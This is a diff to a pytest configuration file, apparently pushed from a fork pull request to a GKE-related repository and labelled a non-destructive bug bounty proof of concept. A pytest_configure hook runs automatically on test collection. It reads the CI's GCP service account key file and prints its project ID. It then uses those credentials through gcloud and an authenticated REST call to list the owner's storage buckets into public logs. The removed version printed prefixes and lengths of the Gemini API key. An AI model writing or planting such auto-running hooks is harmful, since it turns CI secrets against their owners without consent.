@@ -1,74 +1,96 @@
-# Non-Destructive Security PoC — GoogleCloudPlatform/gke-mcp
-# This file PROVES that fork PR code executes with access to secrets
-# It does NOT exfiltrate, use, or reveal full secret values
+# Non-Destructive Security PoC — GCP Resource Access Proof
+# This proves the GCP SA key can access real cloud resources
+# It ONLY lists bucket names — no data is read, modified, or exfiltrated
 #
-# Bug bounty submission by: rootvaibhav-ctrl
-# Vulnerability: pull_request_target executes fork code with secrets
+# Requested by Google Security Team on issue 516355326
 
 import os
 import sys
+import subprocess
+import json
+
 
 def pytest_configure(config):
-    """Runs automatically before any test collection.
-
-    This proves:
-    1. Fork code executes in the workflow (this file is from the fork)
-    2. GCP credentials are accessible (file exists on disk)
-    3. GEMINI_API_KEY is in the environment
-
-    No secrets are exfiltrated or used.
-    """
+    """Runs automatically before any test collection."""
     print("\n" + "=" * 70)
-    print("SECURITY POC - pull_request_target vulnerability demonstration")
+    print("SECURITY POC - GCP Resource Access Demonstration")
     print("=" * 70)
-    print(f"POC executed successfully from fork code")
-    print(f"Python version: {sys.version}")
+    print(f"POC executed from fork code")
     print(f"Working directory: {os.getcwd()}")
     print()
 
-    # Prove GEMINI_API_KEY is accessible (show length only, not value)
-    api_key = os.environ.get("GEMINI_API_KEY", "")
-    print(f"[SECRET ACCESS] GEMINI_API_KEY present: {bool(api_key)}")
-    print(f"[SECRET ACCESS] GEMINI_API_KEY length: {len(api_key)}")
-    if api_key:
-        # Show only first 4 chars — industry standard for proof without exposure
-        print(f"[SECRET ACCESS] GEMINI_API_KEY prefix: {api_key[:4]}...")
-    print()
-
-    # Prove GCP credentials file is accessible
+    # Prove GCP credentials are accessible
     creds_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
-    print(f"[SECRET ACCESS] GOOGLE_APPLICATION_CREDENTIALS set: {bool(creds_path)}")
-    if creds_path:
-        file_exists = os.path.exists(creds_path)
-        print(f"[SECRET ACCESS] Credentials file exists: {file_exists}")
-        if file_exists:
-            file_size = os.path.getsize(creds_path)
-            print(f"[SECRET ACCESS] Credentials file size: {file_size} bytes")
-            # Read just the type field to prove it's a service account key
-            # This does NOT reveal the private key
-            try:
-                import json
-                with open(creds_path) as f:
-                    creds = json.load(f)
-                print(f"[SECRET ACCESS] Credential type: {creds.get('type', 'unknown')}")
-                print(f"[SECRET ACCESS] Project ID: {creds.get('project_id', 'unknown')}")
-                # Do NOT print private_key, private_key_id, or client_email
-            except Exception as e:
-                print(f"[SECRET ACCESS] Could not parse credentials: {type(e).__name__}")
+    project_id = None
+    print(f"[GCP AUTH] GOOGLE_APPLICATION_CREDENTIALS set: {bool(creds_path)}")
+
+    if creds_path and os.path.exists(creds_path):
+        try:
+            with open(creds_path) as f:
+                creds = json.load(f)
+            project_id = creds.get("project_id", "unknown")
+            print(f"[GCP AUTH] Credential type: {creds.get('type', 'unknown')}")
+            print(f"[GCP AUTH] Project ID: {project_id}")
+        except Exception as e:
+            print(f"[GCP AUTH] Could not parse credentials: {e}")
+
     print()
 
-    # List all environment variables starting with GOOGLE_ or GEMINI_
-    print("[ENV SCAN] Google/Gemini environment variables present:")
-    for key in sorted(os.environ.keys()):
-        if key.startswith(("GOOGLE_", "GEMINI_", "GCLOUD_", "GCP_")):
-            val = os.environ[key]
-            # Only show key name and value length, never the value
-            print(f"  {key} = <{len(val)} chars>")
+    # List GCP Storage Buckets via gcloud CLI (pre-installed on GitHub runners)
+    print("[GCP BUCKETS] Listing storage buckets via gcloud CLI...")
+    try:
+        result = subprocess.run(
+            ["gcloud", "storage", "buckets", "list", "--format=value(name)"],
+            capture_output=True,
+            text=True,
+            timeout=30,
+        )
+        if result.returncode == 0 and result.stdout.strip():
+            buckets = result.stdout.strip().split("\n")
+            print(f"[GCP BUCKETS] Found {len(buckets)} bucket(s):")
+            for b in buckets:
+                print(f"  - {b}")
+        elif result.stderr:
+            print(f"[GCP BUCKETS] gcloud stderr: {result.stderr[:300]}")
+        else:
+            print("[GCP BUCKETS] No buckets found or no storage access")
+    except FileNotFoundError:
+        print("[GCP BUCKETS] gcloud CLI not available")
+    except Exception as e:
+        print(f"[GCP BUCKETS] Error: {type(e).__name__}: {e}")
+
+    # Fallback: REST API using google-auth
+    if project_id:
+        print()
+        print("[GCP BUCKETS] Listing via REST API fallback...")
+        try:
+            import google.auth
+            import google.auth.transport.requests
+            import urllib.request
+
+            credentials, proj = google.auth.default()
+            credentials.refresh(google.auth.transport.requests.Request())
+
+            url = f"https://storage.googleapis.com/storage/v1/b?project={project_id}"
+            req = urllib.request.Request(
+                url,
+                headers={"Authorization": f"Bearer {credentials.token}"},
+            )
+            response = urllib.request.urlopen(req, timeout=10)
+            data = json.loads(response.read())
+            items = data.get("items", [])
+            if items:
+                print(f"[GCP BUCKETS REST] Found {len(items)} bucket(s):")
+                for bucket in items:
+                    print(f"  - {bucket['name']}")
+            else:
+                print("[GCP BUCKETS REST] No buckets found")
+        except Exception as e:
+            print(f"[GCP BUCKETS REST] Error: {type(e).__name__}: {e}")
 
     print()
     print("=" * 70)
     print("END OF SECURITY POC")
-    print("This proves fork code executes with access to GCP SA key")
-    print("and Gemini API key. No secrets were exfiltrated.")
+    print("Only bucket names were listed. No data was read or exfiltrated.")
     print("=" * 70)
     print()
